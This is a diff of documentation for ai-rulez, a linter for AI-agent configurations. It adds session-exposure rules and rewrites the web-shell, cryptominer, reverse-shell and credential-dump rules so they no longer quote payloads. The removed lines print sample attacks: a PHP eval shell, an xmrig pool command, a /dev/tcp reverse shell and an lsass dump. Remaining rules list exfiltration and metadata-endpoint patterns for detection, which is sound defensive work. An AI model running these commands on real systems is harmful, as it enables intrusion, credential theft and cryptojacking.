@@ -196,7 +196,7 @@ ai-rulez validate --strict --outputs
 | AR301 | `reference-unknown` | error | Prose names a skill, agent, rule or command that does not exist (`` `x-y` skill ``, `skill `x``, `/x-y`, `Skill(x)`, `subagent_type: x`, `Procedure/reference: skill X`, `skills/X`, `.claude/skills/X/SKILL.md`). Only a name used as a pointer counts: a backticked term followed by a plural kind noun (`` `disable-model-invocation` skills ``) or preceded by an indefinite article (`` a `both` skill ``) is prose, not a reference, a `` `x` rule `` that follows a possessive or a linter or tool name (``eslint's `camelcase` rule``, ``the eslint `no-console` rule``) names a tool's rule and is prose, `` `x` rule `` is never a reference in a tree that defines no rule (names in `lint.known_names` do not count as rules; list a name there to silence it anywhere), and a `skills/` segment nested in another tree (`` src/mastra/public/skills/shared/… ``, unlike `skills/X` or `.claude/skills/X/SKILL.md`) is not a pointer to a skill of this project. The kind word is loose: a name that exists as any other kind (rule, skill, agent, command, context) is not reported. When the configuration declares `[[plugins]]` or `[[marketplaces]]`, or the file mentions a plugin, an unknown skill, agent or command may come from an installed plugin and is reported as `info` (unverifiable) instead of `error` |
 | AR302 | `frontmatter-skill-unknown` | error | Frontmatter `skills:` lists a skill that does not exist |
 | AR303 | `frontmatter-key-unknown` | warning | A top-level frontmatter key no tool reads (`allowed_tools` for `allowed-tools`). Known keys are the Agent Skills specification, the Claude Code skill and subagent references and the keys ai-rulez reads; extend with `allowed_keys` |
-| AR401 | `path-missing` | warning | A backticked repo path (first segment is a top-level entry of the repo) does not exist. A path that exists under a `[[scopes]]` entry's emitted directory is resolved there too. Not reported when the text does not claim the path exists: negated or historical ("there is no", "was removed", "decommissioned", "empty"), an example ("e.g.", "such as", a glob in the same paragraph), an alternative ("or under"), a date or version placeholder (`YYYY-MM-DD`), a build or runtime artifact (`target/`, `.venv/`, `vendor/`, `node_modules/`, or text saying it is gitignored), a ref of another repository (`path @ branch`, or a table row or line naming an `owner/repo` slug), a container image reference (`namespace/name` with no file extension and an image-name underscore, e.g. `armis/sra_session_vnc`), or an ADR number whose file carries a title suffix (`adrs/0065` for `adrs/0065-license.md`). A missing path that git ignores (`.gitignore`, `.git/info/exclude` or the global excludes file) is a local file the text documents and is not reported either (`.claude/settings.local.json`); it is looked up only for a path found missing. Silence the rest with `[lint] allow_paths` (the path may be missing everywhere), `[[lint.ignore_rules]]` (this rule in some files), or `<!-- ai-rulez-lint-ignore: AR401 -->` on the line before or on the line itself |
+| AR401 | `path-missing` | warning | A backticked repo path (first segment is a top-level entry of the repo) does not exist. A path that exists under a `[[scopes]]` entry's emitted directory is resolved there too. Not reported when the text does not claim the path exists: negated or historical ("there is no", "was removed", "decommissioned", "empty"), an example ("e.g.", "such as", a glob in the same paragraph), an alternative ("or under"), a date or version placeholder (`YYYY-MM-DD`), a build or runtime artifact (`target/`, `.venv/`, `vendor/`, `node_modules/`, or text saying it is gitignored), a ref of another repository (`path @ branch`, or a table row or line naming an `owner/repo` slug), a container image reference (`namespace/name` with no file extension and an image-name underscore, e.g. `acme/sra_session_vnc`), or an ADR number whose file carries a title suffix (`adrs/0065` for `adrs/0065-license.md`). A missing path that git ignores (`.gitignore`, `.git/info/exclude` or the global excludes file) is a local file the text documents and is not reported either (`.claude/settings.local.json`); it is looked up only for a path found missing. Silence the rest with `[lint] allow_paths` (the path may be missing everywhere), `[[lint.ignore_rules]]` (this rule in some files), or `<!-- ai-rulez-lint-ignore: AR401 -->` on the line before or on the line itself |
 | AR402 | `skill-resource-missing` | error | A `references/`, `scripts/` or `assets/` path is found neither relative to the skill or command directory nor relative to the repo root (see `--repo-root`). A path that names a sibling skill explicitly (`skills/<other>/references/x.md`, `.claude/skills/<other>/references/x.md`) is resolved against that skill's directory too. The same "not a claim" exemptions as AR401 apply (negated, example, another repository's table row) |
 | AR501 | `hook-missing` | error | A `.claude/settings.json` hook command, or a command in the `hooks` frontmatter of an agent, skill or command, runs a `$CLAUDE_PROJECT_DIR/...` file (in a skill also `${CLAUDE_SKILL_DIR}/...`, resolved against the skill's own directory), or passes a script to `sh`, `bash`, `zsh`, `dash`, `python`, `node`, `ruby` or `perl` (frontmatter also a `./...` script, resolved against the project directory), that does not exist |
 | AR502 | `hook-not-executable` | error | That hook file is executed directly but lacks the executable bit (fixable) |
@@ -370,6 +370,13 @@ ai-rulez validate --strict --outputs
 | AR9J7 | `improve-isolation-unavailable` | warning | The requested optimizer isolation could not be applied: `require` refuses to run, `auto` runs unconfined |
 | AR9J8 | `improve-pr-refused` | error | `improve pr` refused: unsigned or unaccepted run, a different skill at the base, an existing branch, or unusable git |
 | AR9J9 | `improve-adapter-refused` | error | A bundled adapter (`builtin:review-fix`) could not run: no model, no network opt-in or no declared egress |
+| AR9W0 | `exposure-area-term` | error | A term of an area that is not `shared` appears in text a Claude Code session sees at its start: a root `CLAUDE.md` line, an unconditional root rule, a skill or agent listing line, an MCP server name or an enabled plugin key, outside path literals; an artifact of unknown phase counts as start. The message `<kind> "<name>" at session start names term "<term>" of area "<area>"` is a contract for `[[lint.accept]]` `match`. Only reported with an `[exposure]` area map (see [Area term leakage](exposure.md#area-term-leakage)) |
+| AR9W1 | `exposure-area-term-ambiguous` | warning | A skill or agent listed at session start names no term of any area but some ambiguous words; one finding per word, its area every area that uses it joined by `/` (see [Area term leakage](exposure.md#area-term-leakage)) |
+| AR9W2 | `exposure-area-collision` | off | Two skills or agents listed at session start, of different areas (unclassified counts as one), share listing words with a Jaccard index of at least `[exposure] collision_min_score`; setting it turns the rule on at warning, and a `[lint.severity]` entry turns it on at 0.1. The 20 highest pairs are reported on the description line of the pair's first listing, and the rest in one summary finding on the `collision_min_score` line; `ai-rulez exposure collisions` ranks every pair (see [Session exposure and areas](exposure.md#ai-rulez-exposure-collisions)) |
+| AR9W3 | `exposure-start-budget` | off | The estimated tokens a Claude Code session started at the repository root loads before it touches a file (as `ai-rulez exposure` reports them) exceed `[exposure] start_budget`. Setting `start_budget` turns it on at error (see [Session exposure and areas](exposure.md#start-of-session-budgets)) |
+| AR9W4 | `exposure-gate-unreadable` | warning | A skill, command or rule Claude Code loads has frontmatter that does not parse (AR306) while it names `paths`, `disable-model-invocation` or `user-invocable`, or sets `paths` or `disable-model-invocation` to a value of the wrong type (`paths: 5`, `disable-model-invocation: yes`), so whether it is gated, and when it loads, cannot be known. Needs no `[exposure]` table: reported for the claude preset and for a run without a configuration (see [Session exposure and areas](exposure.md#a-gate-that-cannot-be-read)) |
+| AR9W5 | `exposure-map-invalid` | error | The `[exposure]` table or its area map is invalid: a bad scalar key, a duplicate, reserved or non-kebab area name, a bad path claim, a `skill_areas` value that names no area, an unknown key or unreadable `areas_file`, or both `areas_file` and inline areas. Only reported when the configuration has an `[exposure]` table (see [Session exposure and areas](exposure.md)) |
+| AR9W6 | `exposure-skill-area-unknown` | warning | A `skill_areas` key names no skill of the session inventory (a renamed, moved or deleted skill), on its line in the areas file or the configuration; a skill of a plugin that is not enabled still counts (see [Area term leakage](exposure.md#area-term-leakage)) |
 
 ### Generated copies and the duplicate rules
 
@@ -436,8 +443,9 @@ and the codes written as literals in other packages, against it). Ranges are inc
 | `AR9T0`-`AR9T9` | Plugin bundle root components ([#357](https://github.com/Goldziher/ai-rulez/issues/357); `AR9T0`, `AR9T1` used; reported by `validate --strict` and `verify --plugin`, see [Authoring Plugins](plugins.md#single-plugin-vs-monorepo)) | allocated |
 | `AR9U0`-`AR9U9` | Harness built-in names ([#447](https://github.com/Goldziher/ai-rulez/issues/447); `AR9U0`, `AR9U1` used; reported by `validate --strict`, see [Built-in names of harnesses](#built-in-names-of-harnesses)) | allocated |
 | `AR9V0`-`AR9V9` | UI ([#230](https://github.com/Goldziher/ai-rulez/issues/230); out of v5, kept free of other claims; moved from `AR9U` for #447) | reserved |
+| `AR9W0`-`AR9W9` | Session exposure and areas (`AR9W0`-`AR9W6` used; inert without an `[exposure]` table except `AR9W4`, which needs none, see [Session exposure and areas](exposure.md)) | allocated |
 
-Unlisted letters (`AR9I`, `AR9T`, `AR9W`-`AR9Z`) are free. `AR9G`, `AR9M`, `AR9N` and `AR9U` were split
+Unlisted letters (`AR9X`-`AR9Z`) are free. `AR9G`, `AR9M`, `AR9N` and `AR9U` were split
 out of blocks that more than one design had claimed (review and catalog both asked for `AR9G`, publish for `AR9F`,
 a UI for `AR9H`).
 
@@ -538,7 +546,7 @@ secret_patterns = [{ name = "internal token", regex = "corp_[a-z0-9]{10}" }]
 max_network_commands = 3           # AR030 network-heavy limit; default 5, 0 allowed
 
 [lint.load_budgets]                # AR964 harness limits by id, in the limit's own unit; positive integers
-claude-skill-listing = 1200        # ids: claude-skill-listing, codex-agents-chain, codex-skill-listing, windsurf-rule-file, cursor-rule-lines
+claude-skill-listing = 1200        # ids: claude-skill-listing, claude-skill-listing-total, codex-agents-chain, codex-skill-listing, windsurf-rule-file, cursor-rule-lines
 
 [[lint.external]]                  # run with --external only
 name = "my-scanner"
@@ -790,6 +798,7 @@ about: `file` (a line of a scanned text file), `item` (one rule, skill, agent, c
 | `llmstxt` | `AR9P0`-`AR9P6` |
 | `traps` | `AR9C0`-`AR9CA` |
 | `config` | `AR731`, `AR740`-`AR749`, `AR750`-`AR753`, `AR9K0`, `AR9L0`, `AR9I0` (invalid version constraints, the organization policy, the SBOM gates, `[telemetry]` and `[llm]` tables, unused `[[lint.accept]]` entries) |
+| `exposure` | `AR9W0`, `AR9W1` (area terms at session start), `AR9W2` (listings of different areas that overlap), `AR9W3` (the start-of-session budget), `AR9W4` (a frontmatter gate that cannot be read), `AR9W5` (the `[exposure]` table and its area map), `AR9W6` (`skill_areas` keys that name no skill) |
 | `convert` | `AR9F0`-`AR9F5` (the `convert` report; never emitted by `validate`) |
 
 Every registered code is listed in `analyzerGroups` (`internal/lint/analyzer.go`); a test fails for a code that is
@@ -1512,7 +1521,7 @@ does not override it; a rule that reports mild and serious cases at different le
 | AR015 | `secret-in-env-or-header` | error | A literal credential (not a `${VAR}` reference or placeholder) in an MCP server `env` value whose key names a secret, in an `Authorization`/`X-Api-Key`-style header, in a `--token`/`--api-key` argument or a URL query/userinfo, in the top-level `env` of `.claude/settings.json`, or in the headers of an `http` hook. A value shaped like a known credential is reported under any key. The finding names the key and never prints the value; the same checks apply to inline `mcpServers` in agent and skill frontmatter |
 | AR602 | `mcp-config-invalid` | error | A malformed MCP server definition in `config.toml`, the inline `mcpServers` of agent and skill frontmatter, `.mcp.json`, `.cursor/mcp.json` or `.vscode/mcp.json`: an empty server, a stdio server without `command`, an `http`/`sse` server without an absolute `url`, an unknown transport, `args`/`env`/`headers` of the wrong type, or a name defined twice in one file (case-insensitively). The deprecated SSE transport is a warning and a name outside letters, digits, `_` and `-` is info (Claude Code rewrites it in the `mcp__<server>__<tool>` names). A server in `.mcp.json`, `.cursor/mcp.json` or `.vscode/mcp.json` that `config.toml` also defines is a generated copy and is checked once, at its source. A non-loopback `http://` URL is reported by AR024 |
 | AR013 | `auto-invocation-danger` | warning | A skill or command the model can invoke by itself (no `disable-model-invocation: true`) that is allowed unrestricted `Bash` (`Bash`, `Bash(*)`; entries in `lint.security.allowed_tools` pass) and ships `scripts/`, or a subagent with `permissionMode: bypassPermissions`. Text the model reads could start such an item without a request from the user |
-| AR964 | `load-budget-exceeded` | warning | Content past a documented load limit of a configured harness, so the excess never reaches the model: a skill's `description` plus `when_to_use` over 1,536 characters (Claude Code skill listing), rules and context over 32 KiB together (Codex `AGENTS.md` chain, `project_doc_max_bytes`; info from 90%), a rule or context file over 12,000 characters (Windsurf/Devin workspace rules) or 500 lines (Cursor), and skill names and descriptions over 8,000 characters in total (Codex skill listing: warning past the limit, info from 90%; every skill the preset emits counts: authored, included, installed and the ones `scoped_fallback = "skill"` would write, and the message says how many come from includes or installed skills and how many are fallback skills, since the real cap is about 2% of the context window; the Codex rules-and-context total likewise includes included rules, and an included or installed skill over the Claude listing cap is reported on `config.toml`). The limits live in one versioned table (`loadBudgets` in `internal/lint/ar_budget.go`) with the source URL and the date each figure was checked; the Codex skill-listing figure is not yet compared with the vendor page. The Agent Skills 500 lines and 5,000 tokens are enforced by AR901 and AR902 |
+| AR964 | `load-budget-exceeded` | warning | Content past a documented load limit of a configured harness, so the excess never reaches the model: a skill's `description` plus `when_to_use` over 1,536 characters (Claude Code skill listing), the whole Claude Code skill listing over its budget of 1% of the context window at about 4 characters per token, 8,000 characters at the default 200,000 tokens (`claude-skill-listing-total`: only with an `[exposure]` table, measured over the native skills a session lists at start as `ai-rulez exposure` reports them, with `[exposure] plugins` and `context_window`; warning past the budget, info from 90%), rules and context over 32 KiB together (Codex `AGENTS.md` chain, `project_doc_max_bytes`; info from 90%), a rule or context file over 12,000 characters (Windsurf/Devin workspace rules) or 500 lines (Cursor), and skill names and descriptions over 8,000 characters in total (Codex skill listing: warning past the limit, info from 90%; every skill the preset emits counts: authored, included, installed and the ones `scoped_fallback = "skill"` would write, each skill name once, so a mirror at `skills/<name>/SKILL.md` or a plugin bundle's copy is not counted again, and the message says how many come from includes or installed skills and how many are fallback skills, since the real cap is about 2% of the context window; the Codex rules-and-context total likewise includes included rules, and an included or installed skill over the Claude listing cap is reported on `config.toml`). The limits live in one versioned table (`loadBudgets` in `internal/lint/ar_budget.go`) with the source URL and the date each figure was checked; the Codex skill-listing figure is not yet compared with the vendor page. The Agent Skills 500 lines and 5,000 tokens are enforced by AR901 and AR902 |
 | AR210 | `import-invalid` | error | A Claude Code memory import (`@path/to/file.md`, `@./rel.md`) in a rule, context file, skill, agent or command whose file does not exist (looked up next to the file, in the skill directory, at the root and at the repository top). A circular chain and a chain of more than five hops (the depth Claude Code follows) are reported as warnings. Imports inside code spans and fenced blocks, `@~/...` and absolute paths (machine-dependent), e-mail addresses, `@scope/package` names and `@mentions` are ignored |
 | AR963 | `plugin-manifest-invalid` | error | A tracked `.claude-plugin/plugin.json` or `marketplace.json` that breaks the documented manifest schema: invalid JSON, a marketplace entry whose local `source` directory does not exist (relative to the marketplace root, or under `metadata.pluginRoot`), a missing or non-kebab-case `name`, a `version` that is not semver, `author`/`keywords` of the wrong type, component paths (`commands`, `agents`, `skills`, `hooks`, `mcpServers`, ...) that do not start with `./` or leave the plugin, a marketplace without `owner`, with a reserved name (`claude-code-marketplace`, `claude-plugins-official`, ...), with duplicate plugins or a bad `source`; unknown fields are warnings. `${CLAUDE_PLUGIN_ROOT}` left unquoted in a shell-form plugin hook command (a plugin path with a space splits it) is a warning. With `--external`, and when the `claude` binary is on `PATH`, `claude plugin validate <dir> --json` is also run for each plugin directory and its errors and warnings are merged (prefixed `claude plugin validate:`); without the binary this step is skipped silently |
 | AR014 | `exfil-command` | error | A network command (`curl`, `wget`, `nc`, `scp`, `rsync`, httpie, `iwr`) that sends a secret environment variable (`$API_KEY`, `$GITHUB_TOKEN`, `$DATABASE_URL`, names ending in `SECRET`, `TOKEN`, `PASSWORD`, ...), the environment (`env \| curl`, `$(printenv)`) or a credential file off the machine, and DNS exfiltration (`dig $(...)`). Read in prose, fenced shell and scripts, continuation lines joined. A secret used only in an authentication header is a warning (`-H "Authorization: Bearer $TOKEN"`); a line whose URLs are all in `lint.security.allowed_hosts` passes. Fenced shell and scripts are never suppressed by surrounding "never do this" text; an inline code span in prose is not reported when the line is a guardrail ("never run `env \| curl ...`") or a reviewer names it ("flag any skill that contains `printenv \| nc ...`") |
@@ -1546,10 +1555,10 @@ does not override it; a rule that reports mild and serious cases at different le
 | AR043 | `persistence-mechanism` | warning | A command in a script, a fenced block or an inline code span that installs something which outlives the session: `crontab -e`, `crontab -` or `crontab <file>` (not `crontab -l`), `launchctl load/bootstrap/enable/submit`, `systemctl enable/link/preset`, `update-rc.d ... defaults`, `chkconfig ... on`, `schtasks /create`, `Register-ScheduledTask`, a `Run` registry key, a macOS login item, or a write (`>`, `tee`, `cp`, `mv`, `ln`, `install`, a file-write call) into a LaunchAgents/LaunchDaemons, systemd unit, `cron.d`, `init.d`, `rc.local` or autostart path. An append to a shell startup file (`>> ~/.zshrc`, `tee -a ~/.bashrc`, `sed -i` on it) is reported as info because setup guides do it. Prose, DOM identifiers such as `pList`, a `PLIST` variable, example regions, comment lines and markdown text under a negation ("never run") are not reported; a negation word in a script comment does not hide a command |
 | AR044 | `unsafe-deserialization` | warning | A call that rebuilds objects from data and can run code: `pickle`/`cPickle`/`dill`/`cloudpickle` `load(s)`, `pandas.read_pickle`, `marshal.load(s)`, `jsonpickle.decode`, `yaml.load`/`yaml.unsafe_load` without `SafeLoader`, `CSafeLoader` or `BaseLoader`, `torch.load` without `weights_only=True`, `numpy.load(allow_pickle=True)`, PHP `unserialize` (except with `allowed_classes => false`), Ruby `Marshal.load`, `YAML.load`, `YAML.unsafe_load` (never exempt) and `Oj.load` in object mode, Java `ObjectInputStream`, `XMLDecoder` and `enableDefaultTyping`, and `node-serialize`. Only scripts, fenced blocks and inline code spans are read, and a call needs its parenthesis (a span `pickle.loads` in prose is not a call). A script is matched with the rules of its language by extension; example regions, comment lines and text under a negation are skipped. `yaml.load` is left alone in a file that mentions `ruamel`. A safe loader exempts a call only when it sits inside that call's own parentheses; a trailing comment or a second call on the line does not |
 | AR045 | `internal-endpoint-request` | warning | A request to a cloud metadata endpoint (`169.254.169.254`, `169.254.170.2` (ECS task credentials), `100.100.100.200`, `metadata.google.internal`, `fd00:ec2::254`) in a script, fenced block or code span that holds a URL or a fetch command, or in prose that tells the agent to fetch, query or request it. A request to the Docker (`2375`, `2376`), etcd (`2379`), kubelet (`10250`, `10255`) or Kubernetes API (`6443`) port of `localhost` is reported as info. A bare address, a deny list literal, a `startswith`/`endswith` test, a `raise`/`throw` or a conditional that names a defense word before the address (or `raise`/`reject`/`deny` after it), prose that names a defense word before the address or says it "is blocked", text under a negation ("never fetch"), explanatory prose without a request verb and example regions are not reported. Other local ports (a dev server on `8001`, Elasticsearch on `9200`) are not reported |
-| AR046 | `web-shell` | warning | PHP, Python, JSP or ASPX code that runs a command or evaluates code taken from the HTTP request: `system($_GET[...])`, `$_POST['f']($_POST['a'])`, `assert(base64_decode(...))`, `preg_replace` with the `/e` modifier, `exec(request.form[...])`, `os.system(request.args[...])` (also with string concatenation), a `$_SERVER['HTTP_...']` or `$_FILES` field, a backtick echo and a variable function called with a request field, `Runtime.getRuntime().exec(request.getParameter(...))`, `Process.Start(Request.Form[...])`. A line AR005 already reported (an `eval` of dynamic text) is not repeated. Reading a request field as data is not reported; a negated markdown line ("never write ...") is skipped |
-| AR047 | `cryptominer` | warning | A mining pool URL (`stratum+tcp://host:port`; `stratum2+` is accepted too), miner flags (`-o pool:port -u wallet` plus `-p` or `-a`, and pool evidence: a `stratum` scheme, a known pool port such as 3333 or 4444, a wallet-shaped `-u` value of 26+ characters or a miner program name; an `https://` URL with `-u`, and any `curl` or `wget` line, is not one), or a browser coin-mining library (CoinHive, CryptoLoot, JSEcoin, WebMinerPool, DeepMiner). A bare miner program name (`xmrig`, `cpuminer`, `cgminer`, `nbminer`, ...) is reported as info |
-| AR048 | `reverse-shell` | warning | A command that attaches an interactive shell to a socket: `bash -i >& /dev/tcp/host/port 0>&1`, a `/dev/tcp` or `/dev/udp` redirection (`5<> /dev/tcp/...`, `&>`) on a line with an interactive `sh -i`/`bash -l` shell or a descriptor duplicate that involves the socket (`0<&5`, `1>&5`, `0<&1`, `0>&1`; `2>&1` alone is not one), `nc`/`ncat -e sh` (also `/usr/bin/bash`, `cmd.exe`, a quoted command), a `/dev/tcp` port held in a variable, a `mkfifo` relay into `nc`, `socat` joining `exec:sh` and `tcp:`, Python `os.dup2(sock.fileno(), 0)` (also the `for f in (0,1,2)` loop), Ruby `TCPSocket` with `popen`, awk `/inet/tcp`, a PowerShell `TCPClient` stream into `iex`, PHP `fsockopen` with a command runner. A port probe (`nc -zv host 22`, `echo > /dev/tcp/host/port`) is not reported. Command-shaped: example regions and `example_paths` are skipped |
-| AR049 | `offensive-tool` | info | A penetration-testing or credential-dumping tool is named (Metasploit, Mimikatz, Cobalt Strike, SharpHound, Impacket, CrackMapExec, sqlmap, LaZagne, Rubeus, ...). A credential-dump command is a warning: `sekurlsa::`, `lsadump::`, `procdump` of `lsass`, `reg save hklm\sam` (or `security`, `system`), `secretsdump.py`, `impacket-secretsdump`, `comsvcs.dll ... MiniDump`, `ntdsutil ... ifm`. Tool names stay at info. Both are read only in a code block, an inline command or a script: a prose line that names one or quotes a command (a product list, a Sigma rule, defensive documentation) is not reported. Example regions are skipped |
+| AR046 | `web-shell` | warning | PHP, Python, JSP or ASPX code that runs a command or evaluates code taken from the HTTP request: a PHP request superglobal (`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, `$_FILES` or an `HTTP_` server header) passed to a command runner, through backticks, or called as a variable function; an obfuscated eval chain (an eval or assert of decoded data, `preg_replace` with the `/e` modifier); a Flask or Django request field passed to `exec`, `eval`, `os.system` or `subprocess` (also by string concatenation); a JSP request parameter passed to `Runtime.exec` or `ProcessBuilder`; an ASP.NET form field passed to `Process.Start`. A line AR005 already reported (an `eval` of dynamic text) is not repeated. Reading a request field as data is not reported; a negated markdown line ("never write ...") is skipped |
+| AR047 | `cryptominer` | warning | A mining pool URL (a `stratum` scheme over TCP, SSL or TLS; `stratum2` is accepted too), miner flags (a pool host and port, a user and a password or algorithm flag, plus pool evidence: a `stratum` scheme, a known pool port such as 3333 or 4444, a wallet-shaped user of 26+ characters or a miner program name; an `https://` URL with `-u`, and any `curl` or `wget` line, is not one), or a browser coin-mining library. A bare miner program name is reported as info |
+| AR048 | `reverse-shell` | warning | A command that attaches an interactive shell to a socket: a `/dev/tcp` or `/dev/udp` redirection on a line with an interactive or login shell (`-i`, `-l`) and a descriptor duplicate that involves the socket (`0<&5`, `1>&5`, `0<&1`, `0>&1`; `2>&1` alone is not one), also with the port in a variable; netcat or ncat told to run a shell (`/bin/sh`, `/usr/bin/bash`, `cmd.exe` or a quoted command); a named-pipe relay into netcat; `socat` joining a shell to a TCP or OpenSSL address; a Python socket duplicated onto descriptors 0, 1 and 2; a Ruby socket that runs what it reads; an awk TCP socket; a PowerShell TCP stream run as commands; a PHP or Perl socket opened next to a command runner. A port probe (`nc -zv host 22`, `echo > /dev/tcp/host/port`) is not reported. Command-shaped: example regions and `example_paths` are skipped |
+| AR049 | `offensive-tool` | info | A penetration-testing, post-exploitation or credential-dumping tool is named. A credential-dump command is a warning: one that reads the LSA secrets or the SAM, SECURITY or SYSTEM hive, dumps the memory of the LSASS process (with a dump utility or a Windows system DLL), or copies the NTDS database. Tool names stay at info. Both are read only in a code block, an inline command or a script: a prose line that names one or quotes a command (a product list, a Sigma rule, defensive documentation) is not reported. Example regions are skipped |
 | AR050 | `phishing-kit-form` | info | An HTML form whose action is a relative or same-site `*.php` script (not an absolute `http(s)` URL; quoted, unquoted or spaced attributes) named login, signin, verify, secure or account and that holds a password input within 400 characters of the tag |
 | AR051 | `shipped-executable` | warning | A skill directory ships Python bytecode (anything under `__pycache__`, `.pyc`, `.pyo`), a Java class or archive, a native library (`.so`, `.dll`, `.dylib`, `.pyd`, `.node`), an object file or static library (`.o`, `.obj`, `.a`), a WebAssembly module, an `.exe`, or a file of any name that starts like ELF, Mach-O, PE (a DOS header that points to a `PE` signature), a Java class or a `.pyc` header. No text rule can read these, and the scanner skips `__pycache__`, so the bytecode can differ from the source next to it. One finding per file, reported on the file itself (up to 50 per skill), so a second executable is a new finding. `.o`, `.obj` and `.a` are reported only when the file is binary or starts with a known object header (ELF, Mach-O, PE, `!<arch>`), so a Wavefront `.obj` text model is not. A file that git ignores and does not track is not reported; a tracked one is, even when `.gitignore` matches it and even inside `node_modules` or `.venv` (outside git those two directories are not searched). AR034 reports the share of a skill the scan could not read; archives and images are left to it |
 | AR052 | `blank-line-padding` | warning | Twenty or more consecutive blank lines (white space, invisible characters such as zero-width characters, bidirectional marks, hangul fillers and the braille blank, `&nbsp;` and `<br>`; outside fenced code and frontmatter) followed by a paragraph that reads like an instruction: an AR004 phrase, an imperative such as `you must`, `always`, `never`, `do not`, `ignore`, or a command word. The padding moves the text out of view in an editor or a preview. Runs of spaces inside a line, such as aligned table cells, are not counted; padding followed by ordinary prose (a heading or sentence that only mentions instructions or the assistant) and padding at the end of a file are not reported |
@@ -1628,6 +1637,11 @@ repository may add tags, narrow `trusted_orgs`, and lower a limit, and a looser 
 The optional `claude plugin validate` step of AR963 runs with `--external` only.
 
 The rule ideas AR016 to AR034 come from a review of what other skill scanners detect. The patterns, the command tiers and the credential table were written from the public conventions of each tool (where ssh, aws, gpg, kubectl, docker and so on keep secrets); no scanner code, table or message text was copied.
+
+The patterns of AR046 to AR049 and their test cases are stored obscured (`internal/lint/ar_malware_rules.dat`,
+`internal/lint/testdata/ar_malware_cases.dat`), and this page describes them without quoting payloads: anti-malware
+scanners such as Microsoft Defender report a binary or a checkout that holds the payload strings in plain text.
+`go run ./scripts/obscure decode FILE` prints a table for editing and `encode` writes it back.
 <!-- lint-rules-notes:end -->
 
 ## Rule reference
@@ -2091,46 +2105,46 @@ a command or script requests a cloud metadata endpoint (169.254.169.254, metadat
 
 ### AR046 web-shell
 
-PHP, Python, JSP or ASPX code that runs a command or evaluates code taken from the HTTP request (eval($_POST[...]), exec(request.form[...]), Runtime.exec(request.getParameter(...)), Process.Start(Request.Form[...])) or an obfuscated eval chain
+PHP, Python, JSP or ASPX code that runs a command or evaluates code taken from the HTTP request (a PHP request superglobal, a Flask or Django request field, a JSP request parameter or an ASP.NET form field passed to eval or a command runner) or an obfuscated eval chain
 
 - Default severity: `warning`
 - Analyzer: `security` (scope `item`)
 - Why: A script that passes request input to eval or a command runner gives whoever can reach it a remote shell; a skill that ships one is a backdoor.
 - AR005 reports an eval of dynamic text; AR046 covers the request-to-exec shapes of PHP, Python, JSP and ASP.NET and is not repeated on a line AR005 already reported. A line in a markdown block that documents a bad example ("never ...") is skipped. Example regions and `example_paths` do not silence this rule: a documented web shell is still reported.
-- Bad: `<?php eval($_POST['c']); ?>`
+- Bad: A PHP script that passes a POST field to eval
 - Good: Handle request fields as data; never execute them
 
 ### AR047 cryptominer
 
-a mining pool URL (stratum+tcp://), miner command-line flags (-o pool:port -u wallet) or a browser coin-mining library (CoinHive and its successors); a bare miner program name is reported as info
+a mining pool URL (a stratum scheme), miner command-line flags (a pool host and port with a wallet) or a browser coin-mining library; a bare miner program name is reported as info
 
 - Default severity: `warning`
 - Analyzer: `security` (scope `item`)
 - Why: A mining pool address, miner flags or a browser mining script spends the user's CPU for someone else's wallet.
 - A bare miner program name is reported as info; a pool URL, pool flags or a coinjacking library as warning. Pool flags need a password or algorithm flag (`-p`, `-a`) and pool evidence (a `stratum` scheme, a known pool port such as 3333 or 4444, a wallet-shaped `-u` value of 26+ characters, or a miner program name); a `curl` or `wget` line is never one. Example regions do not silence this rule.
-- Bad: `xmrig -o stratum+tcp://pool.example:3333 -u WALLET -p x`
+- Bad: A miner started with a stratum pool URL and a wallet address
 - Good: Remove the miner; a skill that needs compute should say so and use the user's own infrastructure
 
 ### AR048 reverse-shell
 
-a command that hands an interactive shell to a remote host: bash -i >& /dev/tcp/host/port, nc/ncat -e sh, a mkfifo-and-nc relay, socat exec:sh, a Python os.dup2 socket loop, a PowerShell TCPClient loop
+a command that hands an interactive shell to a remote host: an interactive shell redirected to a /dev/tcp socket, netcat told to run a shell, a named-pipe relay through netcat, socat joining a shell to a TCP address, a socket duplicated onto standard input and output, a PowerShell TCP stream run as commands
 
 - Default severity: `warning`
 - Analyzer: `security` (scope `item`)
 - Why: A reverse shell connects the machine to a remote host that then types commands into it.
-- The pattern needs the shell to be attached to a socket (a /dev/tcp redirection on a line with an interactive `sh -i`/`-l` shell or a descriptor duplicate such as `0<&5`, nc -e, mkfifo relay, socat exec, os.dup2 of a socket, a TCPClient stream into iex). A plain port check such as `nc -zv host 22` is not reported. Example regions are skipped.
-- Bad: `bash -i >& /dev/tcp/203.0.113.7/4444 0>&1`
+- The pattern needs the shell to be attached to a socket: a /dev/tcp redirection on a line with an interactive or login shell or a descriptor duplicate such as `0<&5`, netcat told to run a shell, a named-pipe relay, socat joining a shell to TCP, a socket duplicated onto descriptors 0 to 2, a PowerShell TCP stream run as commands. A plain port check such as `nc -zv host 22` is not reported. Example regions are skipped.
+- Bad: An interactive bash whose input and output are redirected to /dev/tcp/<host>/<port>
 - Good: Use ssh or the project's remote-access tooling, documented and authenticated
 
 ### AR049 offensive-tool
 
-a penetration-testing or credential-dumping tool is named in code or a command (Metasploit, Mimikatz, Cobalt Strike, ...); warning when the line is a credential-dump command (sekurlsa::, lsadump::, procdump of lsass, reg save of the SAM hive, secretsdump.py)
+a penetration-testing or credential-dumping tool is named in code or a command; warning when the line is a credential-dump command (one that reads the LSA secrets, the SAM or NTDS database, or the memory of the LSASS process)
 
 - Default severity: `info`
 - Analyzer: `security` (scope `item`)
 - Why: Credential dumping commands read secrets from process memory or registry hives; offensive tool names mark skills that carry or use attack tooling.
-- A tool name alone (Metasploit, Mimikatz, ...) is info; a credential-dump command is a warning. Both are reported only in a code block, an inline command or a script, because defensive and product documentation names them in prose. Example regions are skipped.
-- Bad: `procdump -ma lsass.exe lsass.dmp`
+- A tool name alone is info; a credential-dump command is a warning. Both are reported only in a code block, an inline command or a script, because defensive and product documentation names them in prose. Example regions are skipped.
+- Bad: A full memory dump of the LSASS process
 - Good: Describe detection or hardening without running the dump
 
 ### AR050 phishing-kit-form
@@ -3047,7 +3061,7 @@ a .claude-plugin/plugin.json or marketplace.json breaks the documented schema (r
 
 ### AR964 load-budget-exceeded
 
-content exceeds a documented load limit of a configured harness (Claude skill listing, Codex AGENTS.md chain and skill listing, Windsurf/Devin rule files, Cursor rule length)
